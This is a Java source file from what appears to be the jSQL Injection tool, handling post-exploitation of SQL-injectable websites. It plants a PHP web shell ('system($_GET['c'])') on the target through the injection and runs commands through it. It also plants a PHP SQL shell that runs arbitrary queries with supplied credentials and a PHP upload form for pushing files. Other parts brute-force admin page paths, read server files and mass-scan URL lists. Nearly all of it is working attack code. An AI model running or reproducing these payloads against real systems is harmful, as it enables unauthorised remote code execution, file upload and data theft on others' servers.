/*******************************************************************************
 * Copyhacked (H) 2012-2014.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model.accessible;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.model.InjectionModel;
import com.jsql.model.MediatorModel;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.StoppedByUserException;
import com.jsql.model.injection.method.MethodInjection;
import com.jsql.model.suspendable.SuspendableGetRows;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.StringUtil;
import com.jsql.view.scan.ScanListTerminal;
import com.jsql.view.swing.list.ListItem;

/**
 * Ressource access object.
 * Get informations from file system, commands, webpage.
 */
public class RessourceAccess {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(RessourceAccess.class);

    /**
     * File name for web shell.
     */
    public static final String FILENAME_WEBSHELL
            = "j" + InjectionModel.VERSION_JSQL + ".tmp1.php";
    
    /**
     * File name for upload form.
     */
    public static final String FILENAME_UPLOAD
            = "j" + InjectionModel.VERSION_JSQL + ".tmp2.php";
    
    /**
     * File name for sql shell.
     */
    public static final String FILENAME_SQLSHELL
            = "j" + InjectionModel.VERSION_JSQL + ".tmp3.php";
    
    /**
     * True if admin page sould stop, false otherwise.
     */
    public static boolean isSearchAdminStopped = false;
    
    /**
     * True if scan list sould stop, false otherwise.
     */
    public static boolean isScanStopped = false;
    
    /**
     * True if file search must stop, false otherwise.
     */
    public static boolean isSearchFileStopped = false;
    
    /**
     * True if current user has right to read file. 
     */
    public static boolean readingIsAllowed = false;

    /**
     * Check if every page in the list responds 200 OK.
     * @param urlInjection
     * @param pageNames List of admin pages ot test
     * @throws InterruptedException 
     */
    public static void createAdminPages(String urlInjection, List<ListItem> pageNames) throws InterruptedException {
        String urlWithoutProtocol = urlInjection.replaceAll("^https?://[^/]*", "");
        String urlProtocol = urlInjection.replace(urlWithoutProtocol, "");
        String urlWithoutFileName = urlWithoutProtocol.replaceAll("[^/]*$", "");
        
        List<String> directoryNames = new ArrayList<>();
        if (urlWithoutFileName.split("/").length == 0) {
            directoryNames.add("/");
        }
        for (String directoryName: urlWithoutFileName.split("/")) {
            directoryNames.add(directoryName + "/");
        }

        ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
        CompletionService<CallableAdminPage> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        
        String urlPart = "";
        for (String segment: directoryNames) {
            urlPart += segment;

            for (ListItem pageName: pageNames) {
                taskCompletionService.submit(new CallableAdminPage(urlProtocol + urlPart + pageName.toString()));
            }
        }

        int nbAdminPagesFound = 0;
        int submittedTasks = directoryNames.size() * pageNames.size();
        for (
            int tasksHandled = 0; 
            tasksHandled < submittedTasks && !RessourceAccess.isSearchAdminStopped; 
            tasksHandled++
        ) {
            try {
                CallableAdminPage currentCallable = taskCompletionService.take().get();
                if (currentCallable.isHttpResponseOk()) {
                    Request request = new Request();
                    request.setMessage("CreateAdminPageTab");
                    request.setParameters(currentCallable.getUrl());
                    MediatorModel.model().sendToViews(request);

                    nbAdminPagesFound++;
                }
            } catch (InterruptedException | ExecutionException e) {
                LOGGER.error("Interruption while checking Admin pages", e);
            }
        }

        taskExecutor.shutdown();
        taskExecutor.awaitTermination(5, TimeUnit.SECONDS);

        RessourceAccess.isSearchAdminStopped = false;

        if (nbAdminPagesFound > 0) {
            LOGGER.debug("Admin page(s) found: " + nbAdminPagesFound + "/" + submittedTasks);
        } else {
            LOGGER.trace("Admin page(s) found: " + nbAdminPagesFound + "/" + submittedTasks);
        }

        Request request = new Request();
        request.setMessage("EndAdminSearch");
        MediatorModel.model().sendToViews(request);
    }
    
    /**
     * Create a webshell in the server.
     * @param pathShell Remote path othe file
     * @param url
     * @throws InjectionFailureException
     * @throws StoppedByUserException
     */
    public static void createWebShell(String pathShell, String urlShell) throws InjectionFailureException, StoppedByUserException {
        if (!RessourceAccess.isReadingAllowed()) {
            return;
        }

        String pathShellFixed = pathShell;
        if (!pathShellFixed.matches(".*/$")) {
            pathShellFixed += "/";
        }
        MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().vendor.getValue().getSqlTextIntoFile("<SQLi><?php system($_GET['c']); ?><iLQS>", pathShellFixed + FILENAME_WEBSHELL)
        );

        String[] sourcePage = {""};
        String resultInjection = new SuspendableGetRows().run(
            MediatorModel.model().vendor.getValue().getSqlReadFile(pathShellFixed + FILENAME_WEBSHELL),
            sourcePage,
            false,
            1,
            null
        );

        if ("".equals(resultInjection)) {
            MediatorModel.model().sendResponseFromSite("Can't find web shell at "+ pathShellFixed + FILENAME_WEBSHELL, sourcePage[0].trim());
            return;
        }

        String url = urlShell;
        if ("".equals(url)) {
            url = ConnectionUtil.urlBase.substring(0, ConnectionUtil.urlBase.lastIndexOf('/') + 1);
        }

        if (resultInjection.indexOf("<SQLi><?php system($_GET['c']); ?><iLQS>") > -1) {
            LOGGER.info("Web shell payload sent at "+ pathShellFixed + FILENAME_WEBSHELL);
            
            Request request = new Request();
            request.setMessage("CreateShellTab");
            request.setParameters(pathShellFixed, url);
            MediatorModel.model().sendToViews(request);
        } else {
            LOGGER.warn("Web shell creation failed");
        }
    }
    
    /**
     * Run a shell command on host.
     * @param command The command to execute
     * @param uuidShell An unique identifier for terminal
     * @param urlShell Web path of the shell
     */
    public static void runWebShell(String command, UUID uuidShell, String urlShell) {
        URLConnection connection;
        String result = "";
        try {
            String url = urlShell + FILENAME_WEBSHELL + "?c=" + URLEncoder.encode(command.trim(), "ISO-8859-1");
            connection = new URL(url).openConnection();
            connection.setReadTimeout(ConnectionUtil.timeOut);
            connection.setConnectTimeout(ConnectionUtil.timeOut);

            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line, pageSource = "";
            while ((line = reader.readLine()) != null) {
                pageSource += line + "\n";
            }
            reader.close();

            Matcher regexSearch = Pattern.compile("(?s)<SQLi>(.*)<iLQS>").matcher(pageSource);
            regexSearch.find();

            // IllegalStateException #1544: catch incorrect execution
            try {
                result = regexSearch.group(1);
            } catch (IllegalStateException e) {
                result = "";
                LOGGER.warn("Incorrect response from Web shell");
            }
            
            Map<String, Object> msgHeader = new HashMap<>();
            msgHeader.put("Url", url);
            msgHeader.put("Post", "");
            msgHeader.put("Header", "");
            msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));
            msgHeader.put("Source", pageSource);
            
            Request request = new Request();
            request.setMessage("MessageHeader");
            request.setParameters(msgHeader);
            MediatorModel.model().sendToViews(request);
        } catch (IOException e) {
            LOGGER.error(e, e);
        } finally {
            // Unfroze interface
            Request request = new Request();
            request.setMessage("GetShellResult");
            request.setParameters(uuidShell, result, command);
            MediatorModel.model().sendToViews(request);
        }
    }

    /**
     * Create SQL shell on the server. Override user name and password eventually.
     * @param pathShell Script to create on the server
     * @param url URL for the script (used for url rewriting)
     * @param username User name for current database
     * @param password User password for current database
     * @throws InjectionFailureException
     * @throws StoppedByUserException
     */
    public static void createSqlShell(String pathShell, String urlShell, String username, String password) throws InjectionFailureException, StoppedByUserException {
        if (!RessourceAccess.isReadingAllowed()) {
            return;
        }
        
        String s = 
            "<SQLi><?php mysql_connect('localhost',$_GET['u'],$_GET['p']);"
                + "$result=mysql_query($r=$_GET['q'])or die('<SQLe>Query failed: '.mysql_error().'<iLQS>');"
                + "if(is_resource($result)){"
                    + "echo'<SQLr>';"
                    + "while($row=mysql_fetch_array($result,MYSQL_NUM))echo'<tr><td>',join('</td><td>',$row),'</td></tr>';"
                + "}else if($result==TRUE)echo'<SQLm>Query OK: ',mysql_affected_rows(),' row(s) affected';"
                + "else if($result==FALSE)echo'<SQLm>Query failed';"
            + " ?><iLQS>";

        String pathShellFixed = pathShell;
        if (!pathShellFixed.matches(".*/$")) {
            pathShellFixed += "/";
        }
        
        MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().vendor.getValue().getSqlTextIntoFile(s, pathShellFixed + FILENAME_SQLSHELL)
        );

        String[] sourcePage = {""};
        String resultInjection = new SuspendableGetRows().run(
            MediatorModel.model().vendor.getValue().getSqlReadFile(pathShellFixed + FILENAME_SQLSHELL),
            sourcePage,
            false,
            1,
            null
        );

        if ("".equals(resultInjection)) {
            MediatorModel.model().sendResponseFromSite("Can't find SQL shell at " + pathShellFixed + FILENAME_SQLSHELL, sourcePage[0].trim());
            return;
        }
        
        String url = urlShell;
        if ("".equals(url)) {
            url = ConnectionUtil.urlBase.substring(0, ConnectionUtil.urlBase.lastIndexOf('/') + 1);
        }

        if (resultInjection.indexOf(s) > -1) {
            LOGGER.info("SQL shell payload sent at "+ pathShellFixed + FILENAME_SQLSHELL);
            
            Request request = new Request();
            request.setMessage("CreateSQLShellTab");
            request.setParameters(pathShellFixed, url, username, password);
            MediatorModel.model().sendToViews(request);
        } else {
            LOGGER.warn("SQL shell creation failed");
        }
    }

    /**
     * Execute SQL request into terminal defined by URL path, eventually override with database user/pass identifiers.
     * @param command SQL request to execute
     * @param uuidShell Identifier of terminal sending the request
     * @param urlShell URL to send SQL request against
     * @param username User name [optional]
     * @param password USEr password [optional]
     */
    public static void runSqlShell(String command, UUID uuidShell, String urlShell, String username, String password) {
        URLConnection connection;
        String result = "";
        try {
            String url = urlShell + FILENAME_SQLSHELL +"?q="+ URLEncoder.encode(command.trim(), "ISO-8859-1") +"&u="+ username +"&p="+ password;
            connection = new URL(url).openConnection();
            connection.setReadTimeout(ConnectionUtil.timeOut);
            connection.setConnectTimeout(ConnectionUtil.timeOut);

            BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line, pageSource = "";
            while ((line = reader.readLine()) != null) {
                pageSource += line + "\n";
            }
            reader.close();

            Matcher regexSearch = Pattern.compile("(?s)<SQLi>(.*)<iLQS>").matcher(pageSource);
            regexSearch.find();
            
            // IllegalStateException #1544: catch incorrect execution
            try {
                result = regexSearch.group(1);
            } catch (IllegalStateException e) {
                result = "";
                LOGGER.warn("Incorrect response from SQL shell");
            }
            
            Map<String, Object> msgHeader = new HashMap<>();
            msgHeader.put("Url", url);
            msgHeader.put("Post", "");
            msgHeader.put("Header", "");
            msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));
            msgHeader.put("Source", pageSource);
            
            Request request = new Request();
            request.setMessage("MessageHeader");
            request.setParameters(msgHeader);
            MediatorModel.model().sendToViews(request);
        } catch (IOException e) {
            LOGGER.error(e, e);
        } finally {
            // Unfroze interface
            Request request = new Request();
            request.setMessage("GetSQLShellResult");
            request.setParameters(uuidShell, result, command);
            MediatorModel.model().sendToViews(request);
        }
    }

    /**
     * Upload a file to the server.
     * @param pathFile Remote path of the file to upload
     * @param url URL of uploaded file
     * @param file File to upload
     * @throws InjectionFailureException
     * @throws StoppedByUserException
     * @throws IOException 
     */
    public static void uploadFile(String pathFile, String urlFile, File file) throws InjectionFailureException, StoppedByUserException, IOException {
        if (!RessourceAccess.isReadingAllowed()) {
            return;
        }
        
        String phpShellToInject = "<?php echo move_uploaded_file($_FILES['u']['tmp_name'], getcwd().'/'.basename($_FILES['u']['name']))?'SQLiy':'n'; ?>";

        String pathPhpShellFixed = pathFile;
        if (!pathPhpShellFixed.matches(".*/$")) {
            pathPhpShellFixed += "/";
        }
        
        MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().vendor.getValue().getSqlTextIntoFile("<SQLi>"+ phpShellToInject +"<iLQS>", pathPhpShellFixed + FILENAME_UPLOAD)
        );

        String[] sourcePagePhpShell = {""};
        String phpShellInjected = new SuspendableGetRows().run(
            MediatorModel.model().vendor.getValue().getSqlReadFile(pathPhpShellFixed + FILENAME_UPLOAD),
            sourcePagePhpShell,
            false,
            1,
            null
        );

        if ("".equals(phpShellInjected)) {
            MediatorModel.model().sendResponseFromSite("Can't find upload file at "+ pathPhpShellFixed + FILENAME_UPLOAD, sourcePagePhpShell[0].trim());
            return;
        } else {
            LOGGER.info("Upload payload sent at "+ pathPhpShellFixed + FILENAME_UPLOAD);
        }

        String urlFileFixed = urlFile;
        if ("".equals(urlFileFixed)) {
            urlFileFixed = ConnectionUtil.urlBase.substring(0, ConnectionUtil.urlBase.lastIndexOf('/') + 1);
        }

        if (phpShellInjected.indexOf(phpShellToInject) > -1) {
            String crLf = "\r\n";
            
            URLConnection connection = null;
            URL urlUploadShell = new URL(urlFileFixed +"/"+ FILENAME_UPLOAD);
            connection = urlUploadShell.openConnection();
            connection.setDoOutput(true);
            
            try (
                InputStream streamToUpload = new FileInputStream(file);
            ) {

                byte[] streamData = new byte[streamToUpload.available()];
                streamToUpload.read(streamData);
                
                String headerForm = "";
                headerForm += "-----------------------------4664151417711" + crLf;
                headerForm += "Content-Disposition: form-data; name=\"u\"; filename=\"" + file.getName() +"\""+ crLf;
                headerForm += "Content-Type: binary/octet-stream" + crLf;
                headerForm += crLf;

                String headerFile = "";
                headerFile += crLf + "-----------------------------4664151417711--" + crLf;

                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=---------------------------4664151417711");
                connection.setRequestProperty("Content-Length", String.valueOf(headerForm.length() + headerFile.length() + streamData.length));

                try (
                    OutputStream streamOutputFile = connection.getOutputStream();
                ) {
                    streamOutputFile.write(headerForm.getBytes());
    
                    int index = 0;
                    int size = 1024;
                    do {
                        if (index + size > streamData.length) {
                            size = streamData.length - index;
                        }
                        streamOutputFile.write(streamData, index, size);
                        index += size;
                    } while (index < streamData.length);
    
                    streamOutputFile.write(headerFile.getBytes());
                    streamOutputFile.flush();
                }
                
                try (
                    InputStream streamInputFile = connection.getInputStream();
                ) {
                    char buff = 512;
                    int len;
                    byte[] data = new byte[buff];
                    String result = "";
                    do {
                        len = streamInputFile.read(data);
    
                        if (len > 0) {
                            result += new String(data, 0, len);
                        }
                    } while (len > 0);
    
                    if (result.indexOf("SQLiy") > -1) {
                        LOGGER.debug("Upload successful.");
                    } else {
                        LOGGER.warn("Upload failed.");
                    }
                    
                    Map<String, Object> msgHeader = new HashMap<>();
                    msgHeader.put("Url", urlFileFixed);
                    msgHeader.put("Post", "");
                    msgHeader.put("Header", "");
                    msgHeader.put("Response", StringUtil.getHTTPHeaders(connection));
                    msgHeader.put("Source", result);
    
                    Request request = new Request();
                    request.setMessage("MessageHeader");
                    request.setParameters(msgHeader);
                    MediatorModel.model().sendToViews(request);
                } 
            }
        } else {
            LOGGER.warn("Upload not usable.");
        }
        
        Request request = new Request();
        request.setMessage("EndUpload");
        MediatorModel.model().sendToViews(request);
    }
    
    /**
     * Check if current user can read files.
     * @return True if user can read file, false otherwise
     * @throws InjectionFailureException
     * @throws StoppedByUserException
     */
    public static boolean isReadingAllowed() throws InjectionFailureException, StoppedByUserException {
        String[] sourcePage = {""};

        String resultInjection = new SuspendableGetRows().run(
            MediatorModel.model().vendor.getValue().getSqlPrivilegeCheck(),
            sourcePage,
            false,
            1,
            null
        );

        if ("".equals(resultInjection)) {
            MediatorModel.model().sendResponseFromSite("Can't read privilege", sourcePage[0].trim());
            Request request = new Request();
            request.setMessage("MarkFileSystemInvulnerable");
            MediatorModel.model().sendToViews(request);
            readingIsAllowed = false;
        } else if ("false".equals(resultInjection)) {
            LOGGER.warn("No FILE privilege");
            Request request = new Request();
            request.setMessage("MarkFileSystemInvulnerable");
            MediatorModel.model().sendToViews(request);
            readingIsAllowed = false;
        } else {
            Request request = new Request();
            request.setMessage("MarkFileSystemVulnerable");
            MediatorModel.model().sendToViews(request);
            readingIsAllowed = true;
        }
        
        return readingIsAllowed;
    }
    
    /**
     * Create a panel for each file in the list.
     * @param pathsFiles List of file to read
     * @throws InjectionFailureException
     * @throws StoppedByUserException
     * @throws InterruptedException 
     * @throws ExecutionException 
     */
    public static void readFile(List<ListItem> pathsFiles)
        throws InjectionFailureException, StoppedByUserException, InterruptedException 
    {
        if (!RessourceAccess.isReadingAllowed()) {
            return;
        }

        int countFileFound = 0;
        ExecutorService taskExecutor = Executors.newFixedThreadPool(10);
        CompletionService<CallableFile> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);

        for (ListItem pathFile: pathsFiles) {
            taskCompletionService.submit(new CallableFile(pathFile.toString()));
        }

        List<String> duplicate = new ArrayList<>();
        int submittedTasks = pathsFiles.size();
        
        try {
            for (int tasksHandled = 0 ; tasksHandled < submittedTasks ; tasksHandled++) {
                try {
                    CallableFile currentCallable = taskCompletionService.take().get();
                    if (!"".equals(currentCallable.getFileSource())) {
                        String name = currentCallable.getUrl().substring(currentCallable.getUrl().lastIndexOf('/') + 1, currentCallable.getUrl().length());
                        String content = currentCallable.getFileSource();
                        String path = currentCallable.getUrl();
        
                        Request request = new Request();
                        request.setMessage("CreateFileTab");
                        request.setParameters(name, content, path);
                        MediatorModel.model().sendToViews(request);
        
                        if (!duplicate.contains(path.replace(name, ""))) {
                            LOGGER.info("Shell might be possible in folder "+ path.replace(name, ""));
                        }
                        duplicate.add(path.replace(name, ""));
        
                        countFileFound++;
                    }
                    
                    if (RessourceAccess.isSearchFileStopped) {
                        throw new StoppedByUserException();
                    }
                } catch (ExecutionException e) {
                    // File not found, probably
                }
            }
        } finally {
            taskExecutor.shutdown();
            taskExecutor.awaitTermination(5, TimeUnit.SECONDS);
            
            RessourceAccess.isSearchFileStopped = false;
            
            if (countFileFound > 0) {
                LOGGER.debug("File(s) found: " + countFileFound + "/" + submittedTasks);
            } else {
                LOGGER.trace("File(s) found: " + countFileFound + "/" + submittedTasks);
            }
            Request request = new Request();
            request.setMessage("EndFileSearch");
            MediatorModel.model().sendToViews(request);
        }
    }
    
    public static void scanList(List<ListItem> urlList) {
        // Erase everything in the view from a previous injection
        Request requests = new Request();
        requests.setMessage("ResetInterface");
        MediatorModel.model().sendToViews(requests);
        
        // wait for ending of ongoing interaction between two injections
        try {
            Thread.sleep(500);
        } catch (InterruptedException e) {
            LOGGER.error("Interruption while sleeping during scan", e);
            Thread.currentThread().interrupt();
        }

        // Display result only in console
        MediatorModel.model().deleteObservers();
        MediatorModel.model().addObserver(new ScanListTerminal());
        
        MediatorModel.model().isScanning = true;
        RessourceAccess.isScanStopped = false;
        
        for (ListItem url: urlList) {
            if (MediatorModel.model().isStoppedByUser() || RessourceAccess.isScanStopped) {
                break;
            }
            LOGGER.info("Scanning " + url);
            MediatorModel.model().controlInput(url.toString(), "", "", MethodInjection.QUERY, "POST", true);
            
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
                LOGGER.error("Interruption while sleeping between two scans", e);
                Thread.currentThread().interrupt();
            }
        }
        
        MediatorModel.model().isScanning = false;
        MediatorModel.model().setIsStoppedByUser(false);
        RessourceAccess.isScanStopped = false;

        Request request = new Request();
        request.setMessage("EndScanList");
        MediatorModel.model().sendToViews(request);
    }
}
